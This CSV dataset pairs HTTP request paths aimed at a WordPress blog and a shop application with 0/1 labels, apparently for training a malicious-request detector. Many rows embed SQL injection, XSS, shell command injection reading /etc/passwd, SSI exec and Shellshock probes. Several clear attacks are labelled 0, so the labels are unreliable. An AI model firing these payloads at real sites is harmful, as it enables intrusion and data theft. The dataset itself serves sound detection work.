text,label
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum+where+0+in+%28select+sleep%2815%29+%29+--+/embed,1
"<frameset><frame src=""xss""></frameset>",1
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%23,1
/blog/%28/plugins/user-registration/assets/js/frontend/my-account.min.js?ver=1.8.2.1,1
/blog/index.php/2020/04/04%22+%2F+sleep%2815%29+%2F+%22/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/feed,0
/blog/wp-includes+or+0+in+%28select+sleep%2815%29+%29+--+/js/jquery/ui/core.min.js?ver=1.11.4,1
/c%3A%5C/wp-includes/js/plupload/wp-plupload.min.js?ver=4.9.5,0
/blog/8501779237819759495.owasp.org/feed,0
/blog/index.php/search/feed/0W45pz4p/rss2,0
c/ euclides 51 6?e,0
/blog/wp-content/uploads/2020/04/f74331ba-6a7e-37cc-aefe-7026be7b0c0b.png+UNION+ALL+select+NULL+--+,1
/%7C/wp-content/uploads/2020/04/c357e14e-0af5-317e-a4f7-bc609b90087b-300x200.jpg,0
/blog/%252Fetc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.size.url%20%7D%7D,1
/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5 username=culturedBuzzard5&password=UxW$eq2&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fuser-logout%2F%3F_wpnonce%3D14237a84a5&login=Login&redirect=+where+0+in+%28select+sleep%2815%29+%29+--+&rememberme=forever,1
/blog/wp-content/uploads/2020/040W45pz4p/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-32x32.jpg,0
/ps3unboxing_440/,0
/etc%2Fpasswd/index.php/2020/04/04/page/2,0
/blog/index.php%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,0
/blog/wp-content/uploads/2020/0W45pz4p/1faecdf0-334c-3262-b83f-a897be68c7e2.png,0
/blog/%22/qui-enim-sunt-minima-sit/feed,1
/blog/index.php/sample-page/nulla-quisquam-est-ut-nemo+ASC++--+/embed,1
/blog/wp-content/uploads/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119-1024x682.jpg,0
/blog/index.php%29+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29laGC%29+AND+%285364%3D5364,1
/blog%27%22/wp-login.php?action=lostpassword,1
/blog/https%3A%2F%2F8501779237819759495.owasp.org/js/jquery/jquery-migrate.min.js?ver=1.4.1,0
/blog/index.php+PROCEDURE+ANALYSE%28EXTRACTVALUE%287796%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%287796%3D7796%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29--+Adrz/2020/03/29/distinctio-sequi-officiis-occaecati,1
"/tienda1/miembros/editar.jsp?modo=registro&login=minai&password=12i9o1&nombre=arsacio&apellidos=bomb�+mundaca&email=trlesault@ajuntamentdebcn2-0.ve&dni=72248212z&direccion=c/+las+vinadas,+26,+5?g&ciudad=vilanova+del+cam�&cp=03579&provincia=lleida&ntc=9412852577617017&b1=registrar",0
/blog/index.php/2020%27+OR+%271%27%3D%271/04/04/rerum-soluta-et-quis-excepturi-labore/embed,1
/blog/media-editor.min.js/js/media-editor.min.js?ver=4.9.5,0
/blog/wp-content/uploads%22+%2F+sleep%2815%29+%2F+%22/2020/04/1faecdf0-334c-3262-b83f-a897be68c7e2.png,0
/blog/wp-content+UNION+ALL+select+NULL+--+/uploads/2020/04/40ce1958-204f-369e-bc5a-32d63da4963f.png,1
/tienda1/publico/pagar.jsp?modo=insertar&precio=6502&b1=pasar+por+caja,0
/blog/wp-content/uploads/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29_backup.png,0
/blog/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/accusantium-eveniet-rem-voluptatem,0
/blog/index.php/my-account/lost-password/ user_login=forsakenCoati6&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,0
/blog/wp-content/uploads/2020/04%60cat+%2Fetc%2Fpasswd%60/914665e4-4fbd-3377-9747-d24ebaabf676-300x240.png,0
/blog/index.php/2020/03/22%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/quidem-rerum-sit-doloribus-quia-eum,1
/blog/index.php/2020%25%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/index.php%7C%7Csleep+15/my-account username=adoringPorpoise0&password=zUeDe4&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2F&login=Login&redirect=&rememberme=forever,1
/blog/wp-content/uploads/2020/04%60sleep+15%60/6e5c5163-fca7-365f-898b-acced7ed5063-300x240.png,1
/blog/wp-content/uploads/2020%27%22/04/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.jpg,1
/blog/index.php%22%3Bcat+%2Fetc%2Fpasswd%3B%22/est-reiciendis-laboriosam-aperiam-adipisci-non/embed,0
/blog/index.php/search%7C%7Ccat+%2Fetc%2Fpasswd/feed/feed,0
/blog/index.php/4040%2F2/04/04/consequatur-ad-error-quidem/embed,0
/%2Fca053e21-2e95-34b7-a64b-a8ef08169a27.jpg/wp-content/uploads/2020/04/ca053e21-2e95-34b7-a64b-a8ef08169a27.jpg,0
/equalizer-r0/,0
/blog/wp-includes/js%22+OR+%221%22%3D%221/backbone.min.js?ver=1.2.3,1
/d05677high/,0
/littering/,0
/blog/index.php/my-account/edit-profile/post.php%27+or+0+in+%28select+sleep%2815%29+%29+--+?action=edit&post=%7B%7B%20data.id%20%7D%7D username=adoringPlover6&password=ker4ak&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/tienda1/publico/anadir.jsp?id=1/&nombre=vino+rioja&precio=39&cantidad=69&b1=a�adir+al+carrito,1
/blog/wp-content/uploads/2020/04%22%3Bsleep+15%3B%22/914665e4-4fbd-3377-9747-d24ebaabf676-300x240.png,1
/blog%29/index.php/et-vel-qui-explicabo-autem-rerum-nisi,1
/blog/index.php/2020/03%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL--+-/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/index.php%2527%2526cat%2B%252Fetc%252Fpasswd%2526%2527/my-account/edit-profile/%7B%7B%20data.size.url,1
/blog/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg+ASC++--+,1
"/tienda1/miembros/editar.jsp?modo=registro&login=cinderel&password=rel+igionario&nombre=kenneth&apellidos=hijodalgo+formiga&email=gil-botelho@miami-beach.com.info&dni=81551229z&direccion=el+arquero,+143,+1?d&ciudad=amurrio&cp=37170&provincia=barcelon?a&ntc=8326601768414043&b1=registrar",1
/blog/wp-includes%7C%7Ccat+%2Fetc%2Fpasswd/js/jquery/jquery.js?ver=1.12.4,0
"/tienda1/publico/registro.jsp?modo=registro&login=edi&password=hi8en�6t847&nombre=solp�a&apellidos=morante+aloisio&email=hutcherson_keys@telelujo.bj&dni=88642149b&direccion=pla�a+sant+joan,+56+5c&ciudad=aldehuela+de+la+b�veda&cp=25460&provincia=guadalajara&ntc=7012384151610118&b1=registrar",0
/blog/index.php%7C%7Ccat+%2Fetc%2Fpasswd/2020/03/22,0
/blog/index.php/2020+OR+1%3D1+--+/page,1
/blog/index.php/my-account%22%29+UNION+ALL+select+NULL+--+/edit-profile,1
/tienda1/publico/autenticar.jsp?modo=entrar&login=krogh&pwd=0ras0asadora&remember=off&b1=entrar,0
/governofederal/,0
/blog/wp-content/uploads%27+OR+%271%27%3D%271/2020/04/d2ac875b-15d8-3412-9205-17afbf0ba62d-1024x682.jpg,1
/blog/index.php%27%3Bsleep+15%3B%27/nobis-tenetur-exercitationem-similique,1
/blog/wp-comments-post.php comment=&author=trustingGarlic6&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=11&comment_parent=0,0
/blog/index.php/2020%29+AND+4141%3D4141--+-/03/27,1
"/6wb70v0b.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/blog/index.php/2020/03%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/22,1
/blog/wp-includes%28/css,1
/blog/wp-includes%3Bcat+%2Fetc%2Fpasswd%3B/js/jquery/ui/sortable.min.js?ver=1.11.4,0
/blog/URL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/fugiat-recusandae-voluptatem-ratione-quo-placeat/feed,0
/blog%25%27%29+ORDER+BY+1%23/index.php,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/index.php/my-account/edit-profilebackup/%7B%7B%20data.url%20%7D%7D,0
/blog/c%3A%2F/fugiat-recusandae-voluptatem-ratione-quo-placeat,0
/blog/index.php/2020/03%22+RLIKE+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29aulv%29+AND+%22uNby%22%3D%22uNby/27/qui-ratione-maxime-dolores-consequatur,1
/blog/wp-content+OR+1%3D1+--+/plugins/user-registration/assets/js/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,1
/blog%26cat+%2Fetc%2Fpasswd%26/wp-login.php?reauth=1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fwp-admin%2Fprofile.php,0
/tienda1/miembros/editar.jsp?modo=registro&login=omayma&password=fr78gen5e&nombre=';waitfor+delay+'0:0:15';--&apellidos=pe�afiel&email=flagg@bacoespecialselecci�n.lb&dni=40888726q&direccion=prolongacion+jose+zorrilla+56+&ciudad=muxika&cp=06413&provincia=�vila&ntc=5771094131298411&b1=registrar,1
/blog%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed,1
/obama-tier/,0
/heavymetalmusic/,0
/ms00-053/,0
/blog/wp-content/plugins//assets/css/sweetalert2/sweetalert2.min.css?ver=8.17.1,0
/blog/wp-content/plugins/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/assets/js,0
/blog/wp-content/plugins/user-registration%60cat+%2Fetc%2Fpasswd%60/assets/js/jquery-tiptip,0
/blog%2527%2BOR%2B%25271%2527%253D%25271/index.php/my-account/edit-profile/%7B%7B%20data.model.url%20%7D%7D,1
/142008/,0
/blog/wp-includes/js/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/wp-mediaelement.min.css?ver=4.9.5,0
/blog/wp-comments-post.php comment=&submit=Post+Comment+AND+1%3D1&comment_post_ID=56&comment_parent=0,0
/blog%257C%257Csleep%2B15/index.php/my-account/edit-profile/%7B%7B%20data.model.url%20%7D%7D,1
/blog/wp-content/themes/twentyseventeen/%40/js/navigation.js?ver=1.0,0
/blog/wp-content/themes/twentyseventeen/assets/images%7Ccat+%2Fetc%2Fpasswd%23,0
/question420/,0
/blog/index.php/my-account/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D username=emptyFlamingo1&password=5-&n_&user-registration-login-nonce=6eac0e2d5f%27+where+0+in+%28select+sleep%2815%29+%29+--+&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/blog/wp-includes/js/jquery%22,1
/blog/wp-content/uploads/2020/c%3A%5C/d2ac875b-15d8-3412-9205-17afbf0ba62d-1024x682.jpg,0
/blog%26%26cat+%2Fetc%2Fpasswd/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem,0
/javascript/~root.php,0
/blog/index.php/2020/03%29+AND+6849%3D5048--+-/23,1
/c%3A%5C/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a.png,0
/v15017304/,0
/blog/wp-content/plugins/user-registration/assets%26%26sleep+15/css/sweetalert2/sweetalert2.min.css?ver=8.17.1,1
/blog/wp-content/uploads/2020/%00/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg,0
/javascript/reference.cgi,0
/blog/wp-content/uploads/2020%60sleep+15%60/04/c357e14e-0af5-317e-a4f7-bc609b90087b-300x200.jpg,1
/%40/index.php/aliquam-odio-a-labore-magnam-quam-quis/embed,0
/blog/index.php%27%26sleep+15%26%27/qui-enim-sunt-minima-sit/embed,1
/blog/wp-content/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9-1024x682.jpg%27+%2F+sleep%2815%29+%2F+%27,0
/blog/index.php/2020/03/22%22+AND+8681%3D8681+AND+%22XKrZ%22%3D%22XKrZ,1
/blog/index.php/2020%25%27%29+AND+6572%3D2360--+-/03/23,1
/blog/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=Set-cookie%3A+Tamper%3D61f64ae5-81ad-4c25-95a0-13ac144daad0,0
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/nobis-tenetur-exercitationem-similique,0
/blog/wp-includes/js/jquery.tmp,0
/blog/index.php/2020/04/04%25/tempore-odit-cupiditate-voluptas-laudantium-et-facilis,0
/%5C%5C8501779237819759495.owasp.org/index.php/author/sipes-nolan,0
/blog/index.php/est-reiciendis-laboriosam-aperiam-adipisci-non/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,0
/blog/index.php/2020/03/22/c%3A%5C/feed,0
/blog%29+UNION+ALL+SELECT+NULL--+-/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed,1
/blog/wp-includes/js/plupload/plupload.min.js.3,0
"/tienda1/miembros/editar.jsp?modo=registro&login=tarte&password=8a76nc6l71&nombre=yasmila&apellidos=cun�+llobetre&email=muehlstaedt@enandorra.com.co&dni=59195753d&direccion=calle+badanas,+138+&ciudad=arcenillas&cp=19445&provincia=navarra&ntc=4400954963337317&b1=registrar",0
/http%3A%2F%2F8501779237819759495.owasp.org/index.php/search/student,0
/blog/wp-content/uploads/2020/04%27+OR+%271%27%3D%271/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg,1
/blog/wp-includes/js%22%26sleep+15%26%22/mediaelement/mediaelement-and-player.min.js?ver=4.2.6-78496d1,1
/blog/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a%20-%20Copy.png,0
/blog/index.php/my-account/lost-password/ user_login=euphoricTeal4&ur_reset_password=true&_wpnonce=4b87c6adf6&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Flost-password%2F,1
/niet1224230220.htm,0
/blog/index.php/registration/ first_name=ZAP&user_login=trustingPudding2&user_pass=ZAP+AND+1%3D2+--+&user_confirm_password=eAQwi0M&last_name=ZAP&user_email=foo-bar%40example.com&user_confirm_email=foo-bar%40example.com&ur-user-form-id=97&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf,1
/blog/index.php/category/uncategorized/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,0
/blog%27+UNION+ALL+select+NULL+--+/index.php/2020/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat,1
/blog/wp-content/uploads/2020/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/f51dfb19-3fe8-380e-91a6-3912fdae661e-300x200.jpg,0
/blog/Set-cookie%3A+Tamper%3D7270f8e6-afe7-4fcb-ad42-4dbca8b87ca4/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702.png,0
/blog/index.php/author/barton03%60cat+%2Fetc%2Fpasswd%60,0
/blog%22+OR+%221%22%3D%221/index.php/sample-page/embed,1
/138195/,0
/blog%7C%7Ccat+%2Fetc%2Fpasswd/index.php/2020/03/27,0
/blog%25%27++--+/index.php/search/virus,1
/blog/index.php/2020/03%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/27/qui-ratione-maxime-dolores-consequatur/embed,1
/blog+UNION+ALL+SELECT+NULL%2CNULL%23/index.php/2020/03/29/distinctio-sequi-officiis-occaecati,1
/blog/index.php/2020/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum%3B,1
/blog/index.php/my-account%27%26cat+%2Fetc%2Fpasswd%26%27/embed,0
4898771590601702,0
38788994t,0
/blog%22+or+0+in+%28select+sleep%2815%29+%29+--+/index.php/qui-enim-sunt-minima-sit,1
/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E/wp-content/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg,0
/blog/wp-content/plugins/user-registration/assets%60cat+%2Fetc%2Fpasswd%60/js/inputmask,0
/blog%27+RLIKE+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29edAn%29+AND+%27gdva%27%3D%27gdva/index.php/2020/03/22,1
/blog/wp-content/uploads/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119-1024x682.jpg,0
/blog/wp-comments-post.php comment=&author=pridefulLemur5&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=11&comment_parent=0,0
/blog/wp-comments-post.php comment=&author=anxiousBoars3&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=http%3A%2F%2F8501779237819759495.owasp.org&comment_post_ID=11&comment_parent=0,0
/blog/index.php/my-account/lost-password/?reset-link-sent=true%22+AND+%221%22%3D%221%22+--+,1
/blog/index.php/2020/04/04%26cat+%2Fetc%2Fpasswd%26/explicabo-qui-fuga-distinctio-dolores-voluptatibus-sit/embed,0
/blog/index.php/2020/03%22%29+AND+5889%3D6950--+-/27/qui-ratione-maxime-dolores-consequatur/embed,1
/blog/index.php/2020%60cat+%2Fetc%2Fpasswd%60/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat/embed,0
/blog%22+AND+%221%22%3D%221/index.php/page,1
/blog/wp-login.php%27+AND+%271%27%3D%271?action=register user_login=sincereTacos0&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,1
/blog/index.php%60cat+%2Fetc%2Fpasswd%60/my-account/user-logout,0
/blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed,1
/blog/wp-content/uploads/2020/%7C/bdffa507-6fa1-380b-b720-116dfaf00c82.jpg,0
/blog%27+%2F+sleep%2815%29+%2F+%27/wp-admin,0
/blog/wp-login.php?action=register user_login=unhappyCake8&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%25%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%23/embed,1
/templefortuna/,0
/blog/wp-content/uploads/2020+OR+1%3D1+--+/04/c357e14e-0af5-317e-a4f7-bc609b90087b-300x200.jpg,1
/tienda1/publico/autenticar.jsp?modo=entrar&login=scheffle&pwd=floti4la&remember=off&b1=entrar,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=welten&pwd=1am2o233e29&remember=off&b1=entrar,0
/blog/index.php/2020/03%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/27/qui-ratione-maxime-dolores-consequatur,1
/blog/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?ver=%27,1
/blog/index.php/nihil-dolorem-molestiae-recusandae-corrupti-qui-alias/%22%27,1
/https%3A%2F%2F8501779237819759495.owasp.org/index.php/tag/nobis-perspiciatis-optio/feed,0
7756,0
/automobili/,0
/manual/ko/en/,0
/blog/index.php/tag/zApPX1514sS/feed,0
/blog/wp-includes/js/api-request.min.js?ver=4.9.5%27+or+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/index.php/2020/03%27+RLIKE+%28SELECT+%28CASE+WHEN+%286146%3D3543%29+THEN+03+ELSE+0x28+END%29%29+AND+%27TrFf%27+LIKE+%27TrFf/23,1
/blog/wp-admin/%2F,0
/blog/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=https%3A%5C%5C8501779237819759495.owasp.org,0
/blog/wp-content/plugins/user-registration%27%22/assets/js/jquery-tiptip,1
/blog/%00/sample-page/ut-aspernatur-est-dolores/feed,0
/blog/wp-content/plugins/user-registration/assets/css%25/user-registration.css?ver=1.8.2.1,0
/blog/index.php/2020%29+AND+EXTRACTVALUE%284931%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28ELT%284931%3D4931%2C1%29%29%29%2C0x3a6172743a%29%29+AND+%284386%3D4386/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/%2528%2529%2B%257B%2B%253A%253B%257D%253B%2Becho%2B%2527X-Powered-By%253A%2BShellShock-Vulnerable%2527/index.php/my-account/edit-profile/%7B%7B%20data.model.url,1
/blog+or+0+in+%28select+sleep%2815%29+%29+--+/wp-includes/css/admin-bar.min.css?ver=4.9.5,1
escribida,0
/blog/wp-includes/js+AND+1%3D1/mediaelement/wp-mediaelement.min.js?ver=4.9.5,1
/blog/index.php%22%3Bcat+%2Fetc%2Fpasswd%3B%22/2020/04/04/page/2,0
/0W45pz4p/index.php/my-account username=rafael&password=espa%C3%B1a01&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2F&login=Login&redirect=,0
/blog/%27%22/2020/04/04/hic-porro-nihil-non-rerum,1
/blog/index.php/%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E/edit-profile/%7B%7B%20data.sizes.medium.url%20%7D%7D,1
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%26%26cat+%2Fetc%2Fpasswd/feed,0
/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidada=4&b1=a�adir+al+carrito,1
/blog/index.php0W45pz4p/author/vtromp,0
/2169793/,0
/blog/wp-content/uploads%26%26cat+%2Fetc%2Fpasswd/2020/04/f51dfb19-3fe8-380e-91a6-3912fdae661e-300x200.jpg,0
/blog/index.php/author/vtromp/%27%22,1
/blog/wp-includes/wlwmanifest.gz,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=prinz&pwd=17spichar&remember=off&b1=entrar,0
/blog/index.php/ut-aspernatur-est-dolores/feed/,0
/blog/wp-content/uploads/2020/%2F/ff237aac-eda3-37f9-8529-2cbfc90951b2.jpg,0
/blog/wp-content/plugins/user-registration/assets/js/frontend%27+%2F+sleep%2815%29+%2F+%27/jquery.validate.min.js?ver=1.15.1,0
/blog/wp-content%22+where+0+in+%28select+sleep%2815%29+%29+--+/uploads/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,1
/a5327994/,0
"/tienda1/miembros/editar.jsp?modo=registro&login=yechezke&password=4e5i53te1do&nombre=celedonio&apellidos=sabata+lechuga&email=ostrander@x2.com.kr&dni=61273686f&direccion=c/+pekin,+72+1h&ciudad=priego+de+c�rdoba&cp=29718&provincia=granada&ntc=6764514910322971&b1=registrar",0
7964,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=averill&pwd=dis2rim2_6&remember=on&b1=entrar,0
/blog/index.php/2020/03/27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
"/tienda1/publico/registro.jsp?modo=registro&login=charity&password=pulsativo&nombre=laureana&apellidos=sordo+alquinta&email=pilbeam.pouyet@jesusfelipe.gh&dni=38072095b&direccion=ori+mendiaren,+38,+&ciudad=dehesa+de+montejo&cp=43110&provincia=la+rioja&ntc=5216679138022321&b1=registrar",0
/%5C%5C8501779237819759495.owasp.org/index.php/category,0
/blog/index.php/2020/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat/embed%27%22,1
/blog/wp-includes/js/underscore.min.js?ver=1.8.3%22+OR+%221%22%3D%221%22+--+,1
/%2F%2F8501779237819759495.owasp.org/wp-includes/css/buttons.min.css?ver=4.9.5,0
/blog/wp-includes/js/jquery/ui/sortable.min.js+where+0+in+%28select+sleep%2815%29+%29+--+?ver=1.11.4,1
/blog/wp-includes/c%3A%5C/wp-embed-template-ie.min.css?ver=4.9.5,0
/blog/%2F/uploads/2020/04/e3780f73-5198-35c8-8ece-d2d4feda884e-1024x682.jpg,0
/blog/index.php/2020/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum+UNION+ALL+select+NULL+--+/feed,1
/blog/index.php/my-account/user-logout%22%29+UNION+ALL+select+NULL+--+?_wpnonce=14237a84a5,1
/blog0W45pz4p/wp-content/themes/twentyseventeen/style.css?ver=4.9.5,0
/tienda1/miembros/editar.jsp?modo=registro&login=banik&password=mord1sco&nombre=ian&apellidos=unger&email=miura@mataroweb.lt&dni=54930635b&direccion=c/+vistabella+82+12?d&ciudad=calomarde&cp=08504&provincia=zaragoza&ntc=3983408909914725&b1=registrar,0
/examples/jsp/jsp2/jspx/wiki/edit.php?page=sandbox&suck_url=../kernel/config_inc.php&do_suck=h,1
/blog%3Bsleep+15%3B/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/feed,1
/blog/index.php%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/22,1
/blog%25%22++--+/index.php/my-account/edit-profile,1
/blog/wp-content/uploads/2020/04%7C%7Ccat+%2Fetc%2Fpasswd/27f17687-adda-3ce6-9767-0037ea74eec2-300x240.png,0
/blog/index.php/page+where+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/index.php/my-account/edit-profile%2Bor%2B0%2Bin%2B%2528select%2Bsleep%252815%2529%2B%2529%2B--%2B/%7B%7B%20data.size.url,1
/blog%27%26cat+%2Fetc%2Fpasswd%26%27/index.php/author/vtromp,0
/blog/index.php/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/sipes-nolan/feed,0
